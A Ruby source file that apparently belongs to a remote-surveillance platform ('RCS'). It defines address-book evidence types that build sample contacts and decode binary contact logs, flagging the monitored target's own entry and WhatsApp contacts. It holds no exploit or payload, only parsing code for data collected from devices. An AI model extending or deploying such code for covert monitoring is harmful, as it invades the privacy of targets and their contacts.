require 'rcs-common/evidence/common'
require 'rcs-common/serializer'

module RCS

  module AddressbookEvidence
    def content
      fields = { :first_name => ["John", "Liza", "Bruno"].sample, :last_name => ["Doe", "Rossi", "Bianchi"].sample, :company => ["Acme Inc.", "Disney", "Apple Inc."].sample, :mobile_phone_number => ["00155597865", "0012342355", "+3901234567"].sample}
      AddressBookSerializer.new.serialize fields
    end

    def generate_content
      [ content ]
    end

    def decode_content(common_info, chunks)
      stream = StringIO.new chunks.join

      until stream.eof?
        info = Hash[common_info]
        info[:data] ||= Hash.new

        contact = AddressBookSerializer.new.unserialize stream

        info[:data][:name] = contact.name
        info[:data][:contact] = contact.contact
        info[:data][:info] = contact.info
        info[:data][:program] = contact.program
        info[:data][:type] = contact.type

        yield info if block_given?
      end
      :delete_raw
    end
  end # ::AddressbookEvidence

  module IaddressbookEvidence

    VERSION_2 = 0x10000000
    CONTACTLIST = 0x0000C021
    CONTACTFILE = 0x0000C022

    LOCAL_CONTACT = 0x80000000

    PROGRAM_WHATSAPP = 0x00000001

    def content
      header = StringIO.new
      header.write [CONTACTLIST | VERSION_2].pack('L')
      header.write [0].pack('L')   # len (ignored)
      header.write [1].pack('L')   # num records

      header.write [CONTACTFILE].pack('L')
      header.write [LOCAL_CONTACT].pack('L')   # flags
      header.write [0].pack('L')   # len (ignored)

      name = "FirstName".to_utf16le_binary_null
      write_name(header, name)

      name = "LastName".to_utf16le_binary_null
      write_name(header, name)

      header.write [CONTACTFILE].pack('L')
      header.write [1].pack('L')   # num_contacts

      name = "+39123456789".to_utf16le_binary_null
      write_number(header, name)

      header.string
    end

    def generate_content
      [content]
    end

    def decode_content(common_info, chunks)
      stream = StringIO.new chunks.join

      # ABLogStruct
      magic_ver = read_uint32 stream
      raise EvidenceDeserializeError.new("invalid log version for IADDRESSBOOK [#{magic_ver} != #{CONTACTLIST}]") unless magic_ver == CONTACTLIST or magic_ver == (CONTACTLIST | VERSION_2)

      stream.read(4) # len, ignore
      num_records = read_uint32 stream

      for i in (0..num_records-1)

        info = Hash[common_info]
        info[:data] ||= Hash.new
        info[:data][:program] = :phone

        # ABFile
        magic = read_uint32 stream
        raise EvidenceDeserializeError.new("invalid log version for IADDRESSBOOK [#{magic} != #{CONTACTFILE}]") unless magic == CONTACTFILE
        flags = read_uint32(stream) if (magic_ver & VERSION_2 != 0)

        info[:data][:type] = :target if (flags & LOCAL_CONTACT != 0)
        info[:data][:program] = :whatsapp if (flags & PROGRAM_WHATSAPP != 0)

        len = read_uint32 stream

        #ABName (first name)
        first_name = read_name(stream)

        #ABName (last name)
        last_name = read_name(stream)

        info[:data][:name] = "#{first_name} #{last_name}"

        #ABContacts
        magic = read_uint32 stream
        num_contacts = read_uint32 stream

        for i in (0..num_contacts-1)
          type, number = read_number(stream)
          case type
            when 0
              info[:data][:info] ||= number
            else
              info[:data][:info] += "#{number}\n"
          end
        end

        trace :debug, "IADDRESSBOOK #{info[:data]}"

        yield info if block_given?
      end

      :keep_raw
    end

    def read_name(stream)
      magic = read_uint32 stream
      len = read_uint32 stream
      stream.read(len).utf16le_to_utf8
    end

    def write_name(stream, name)
      stream.write [CONTACTFILE].pack('L')
      stream.write [name.bytesize].pack('L')
      stream.write name
    end

    def read_number(stream)
      magic = read_uint32 stream
      type = read_uint32 stream
      name = read_name(stream)
      return type, name
    end

    def write_number(stream, number)
      stream.write [CONTACTFILE].pack('L')
      stream.write [0].pack('L') # type
      write_name(stream, number)
    end

  end # ::IAddressbookEvidence

end # ::RCS
